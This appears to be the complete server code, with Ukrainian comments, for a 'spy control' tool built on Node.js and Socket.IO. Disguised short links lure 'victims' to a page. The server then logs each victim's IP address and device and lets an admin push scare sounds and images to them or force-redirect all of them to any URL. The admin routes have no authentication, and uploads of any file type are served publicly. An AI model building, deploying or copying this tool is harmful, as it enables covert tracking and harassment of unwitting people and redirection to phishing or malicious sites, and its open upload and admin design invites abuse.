/**
 * SPY CONTROL SERVER v8.0 ULTIMATE
 * Включає: Socket.IO, File Uploads, Short Links, Real-time Monitoring
 */

const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// --- КОНФІГУРАЦІЯ ---
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

// Перевірка та створення папки для файлів
if (!fs.existsSync(UPLOAD_DIR)) {
    console.log('📂 Creating upload directory...');
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// Налаштування Express
app.use(express.json());
// Спочатку віддаємо статику (файли)
app.use(express.static('public'));

// --- MULTER (Завантаження файлів) ---
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOAD_DIR);
    },
    filename: (req, file, cb) => {
        // Генеруємо безпечне ім'я файлу (щоб не було дублікатів)
        const ext = path.extname(file.originalname);
        const name = `${Date.now()}-${uuidv4().slice(0, 8)}${ext}`;
        cb(null, name);
    }
});
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } // Ліміт 50MB
});

// --- БАЗА ДАНИХ (RAM) ---
const sessions = {};       // Зберігає налаштування кімнат
const activeVictims = {};  // Зберігає активних користувачів
const shortLinks = {};     // Map: ShortCode -> Full UUID

// --- ДОПОМІЖНІ ФУНКЦІЇ ---

// Генератор випадкового короткого коду (6 символів)
function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    // Перевірка на колізії (малоймовірно, але професійно)
    if (shortLinks[result]) return generateShortCode();
    return result;
}

// Форматування шляху до файлу
function fileToPublicUrl(filename) {
    return `/uploads/${filename}`;
}

// Додавання файлів у структуру сесії
function addFilesToSession(sessionArr, files, type) {
    if (!files || files.length === 0) return;
    files.forEach(f => {
        sessionArr.push({
            filename: f.filename,
            url: fileToPublicUrl(f.filename),
            originalname: f.originalname,
            uploadedAt: new Date().toLocaleString('uk-UA'),
            type: type
        });
    });
}

// Визначення пристрою за User-Agent
function parseDevice(ua) {
    if (!ua) return "Unknown";
    if (ua.includes('Android')) return "📱 Android";
    if (ua.includes('iPhone')) return "📱 iPhone";
    if (ua.includes('Windows')) return "💻 Windows PC";
    if (ua.includes('Macintosh')) return "💻 Mac";
    if (ua.includes('Linux')) return "🐧 Linux";
    return "📱 Device";
}

// Ініціалізація нової сесії
function createSessionObject(req, soundUrl = '', imageUrl = '') {
    const id = uuidv4();
    const shortCode = generateShortCode();
    
    // Зберігаємо зв'язок короткого коду з ID
    shortLinks[shortCode] = id;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const ua = req.headers['user-agent'] || 'Unknown';

    sessions[id] = {
        id: id,
        shortCode: shortCode, // Зберігаємо короткий код
        sound: soundUrl,
        image: imageUrl,
        createdAt: new Date().toLocaleString('uk-UA'),
        lastActiveAt: Date.now(),
        totalVictims: 0,
        creator: {
            ip: ip.split(',')[0].trim(),
            device: parseDevice(ua)
        },
        imagesFiles: [],
        soundsFiles: []
    };

    console.log(`[SESSION] Created: ${id} (Short: ${shortCode})`);
    return sessions[id];
}

// Оновлення клієнтів (жертв)
function broadcastUpdate(roomId) {
    const s = sessions[roomId];
    if (!s) return;

    // Визначаємо актуальний контент (останній завантажений файл або URL)
    const currentSound = (s.soundsFiles.length > 0) 
        ? s.soundsFiles[s.soundsFiles.length - 1].url 
        : (s.sound || '');
        
    const currentImage = (s.imagesFiles.length > 0) 
        ? s.imagesFiles[s.imagesFiles.length - 1].url 
        : (s.image || '');

    s.lastActiveAt = Date.now();
    
    // Надсилаємо команду через WebSocket
    io.to(roomId).emit('update-media', { sound: currentSound, image: currentImage });
}

// --- МАРШРУТИЗАЦІЯ (ROUTES) ---

// Головна сторінка -> Адмінка
app.get('/', (req, res) => res.redirect('/admin.html'));

// 1. Створення сесії (тільки посилання)
app.post('/create', (req, res) => {
    try {
        const { sound, image } = req.body;
        const session = createSessionObject(req, sound, image);
        res.json({ id: session.id, shortUrl: session.shortCode });
    } catch (e) {
        console.error("Create Error:", e);
        res.status(500).json({ error: "Server error" });
    }
});

// 2. Створення сесії (із завантаженням файлів)
app.post('/create-upload', upload.fields([{ name: 'images' }, { name: 'sounds' }]), (req, res) => {
    try {
        const session = createSessionObject(req);
        
        if (req.files['images']) addFilesToSession(session.imagesFiles, req.files['images'], 'image');
        if (req.files['sounds']) addFilesToSession(session.soundsFiles, req.files['sounds'], 'sound');

        res.json({ id: session.id, shortUrl: session.shortCode });
    } catch (e) {
        console.error("Upload Error:", e);
        res.status(500).json({ error: "Upload failed" });
    }
});

// 3. Оновлення сесії (посилання)
app.post('/update-session/:id', (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });

    if (req.body.sound !== undefined) sessions[id].sound = req.body.sound;
    if (req.body.image !== undefined) sessions[id].image = req.body.image;

    broadcastUpdate(id);
    res.json({ success: true });
});

// 4. Дозавантаження картинок
app.post('/session/:id/upload-images', upload.array('images'), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Not found' });

    addFilesToSession(sessions[id].imagesFiles, req.files, 'image');
    broadcastUpdate(id);
    res.json({ success: true });
});

// 5. Дозавантаження звуків
app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Not found' });

    addFilesToSession(sessions[id].soundsFiles, req.files, 'sound');
    broadcastUpdate(id);
    res.json({ success: true });
});

// 6. Отримання списку сесій (для Watch.html)
app.get('/sessions', (req, res) => {
    const list = Object.values(sessions).map(s => {
        // Рахуємо онлайн
        const online = Object.values(activeVictims).filter(v => v.roomId === s.id).length;
        
        return {
            id: s.id,
            shortCode: s.shortCode, // Віддаємо короткий код
            fullUrl: `${req.protocol}://${req.get('host')}/${s.shortCode}`,
            createdAt: s.createdAt,
            lastActiveAt: s.lastActiveAt,
            totalVictims: s.totalVictims,
            onlineCount: online,
            creator: s.creator,
            imagesFiles: s.imagesFiles,
            soundsFiles: s.soundsFiles
        };
    }).sort((a, b) => b.lastActiveAt - a.lastActiveAt);

    res.json(list);
});

// 7. Видалення сесії
app.delete('/session/:id', (req, res) => {
    const id = req.params.id;
    if (sessions[id]) {
        // Видалення файлів (асинхронно, не блокуємо відповідь)
        const filesToDelete = [...sessions[id].imagesFiles, ...sessions[id].soundsFiles];
        filesToDelete.forEach(f => {
            fs.unlink(path.join(UPLOAD_DIR, f.filename), (err) => {
                if(err) console.error(`Failed to delete ${f.filename}`);
            });
        });

        // Видаляємо короткий лінк
        const code = sessions[id].shortCode;
        if (code && shortLinks[code]) delete shortLinks[code];

        delete sessions[id];
        console.log(`[SESSION] Deleted: ${id}`);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// --- СИСТЕМА КОРОТКИХ ПОСИЛАНЬ ---
// Важливо: цей маршрут має бути в кінці, щоб не перехоплювати інші запити
app.get('/:shortCode', (req, res) => {
    const code = req.params.shortCode;
    
    // Ігноруємо favicon.ico та системні файли
    if (code === 'favicon.ico' || code.includes('.')) return res.sendStatus(404);

    const sessionId = shortLinks[code];
    
    if (sessionId) {
        console.log(`[REDIRECT] Short link ${code} -> Session ${sessionId}`);
        // Перенаправляємо на справжню сторінку жертви з ID
        res.redirect(`/victim.html?id=${sessionId}`);
    } else {
        res.status(404).send(`
            <h1 style="color:red; font-family:sans-serif; text-align:center; margin-top:50px;">
                404 - LINK NOT FOUND
            </h1>
        `);
    }
});

// --- SOCKET.IO ЛОГІКА ---
io.on('connection', (socket) => {
    
    // --- АДМІН ---
    socket.on('join-room-admin', (roomId) => {
        socket.join(roomId);
        sendVictimListToAdmin(roomId);
    });

    socket.on('trigger-redirect', (data) => {
        // Бомбардування (перенаправлення всіх)
        io.to(data.roomId).emit('force-redirect', { url: data.url });
        console.log(`[ACTION] Redirect triggered for room ${data.roomId}`);
    });

    socket.on('trigger-scare', (roomId) => {
        // Скрімер
        io.to(roomId).emit('play-sound');
        console.log(`[ACTION] Scare triggered for room ${roomId}`);
    });

    // --- ЖЕРТВА ---
    socket.on('join-room-victim', (data) => {
        const roomId = data.roomId;
        socket.join(roomId);

        // Отримуємо IP
        const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

        activeVictims[socket.id] = {
            socketId: socket.id,
            roomId: roomId,
            device: parseDevice(data.userAgent),
            ip: ip.split(',')[0].trim()
        };

        console.log(`[VICTIM] Connected: ${activeVictims[socket.id].ip} -> Room ${roomId}`);

        if (sessions[roomId]) {
            sessions[roomId].totalVictims++;
            sessions[roomId].lastActiveAt = Date.now();
            
            // Відправляємо медіа одразу при підключенні
            const s = sessions[roomId];
            const currentSound = (s.soundsFiles.length > 0) ? s.soundsFiles[s.soundsFiles.length - 1].url : (s.sound || '');
            const currentImage = (s.imagesFiles.length > 0) ? s.imagesFiles[s.imagesFiles.length - 1].url : (s.image || '');
            
            socket.emit('update-media', { sound: currentSound, image: currentImage });
        }

        sendVictimListToAdmin(roomId);
        io.to(roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });
    });

    socket.on('disconnect', () => {
        const v = activeVictims[socket.id];
        if (v) {
            console.log(`[VICTIM] Disconnected: ${v.ip}`);
            delete activeVictims[socket.id];
            sendVictimListToAdmin(v.roomId);
        }
    });
});

function sendVictimListToAdmin(roomId) {
    const list = Object.values(activeVictims).filter(v => v.roomId === roomId);
    io.to(roomId).emit('update-victim-list', list);
}

// --- ЗАПУСК СЕРВЕРА ---
http.listen(PORT, '0.0.0.0', () => {
    console.log('=========================================');
    console.log(`🚀 SPY SERVER STARTED ON PORT: ${PORT}`);
    console.log(`📂 Uploads Directory: ${UPLOAD_DIR}`);
    console.log(`🔗 Admin Panel: http://localhost:${PORT}/admin.html`);
    console.log(`🔗 Monitoring:  http://localhost:${PORT}/watch.html`);
    console.log('=========================================');
});
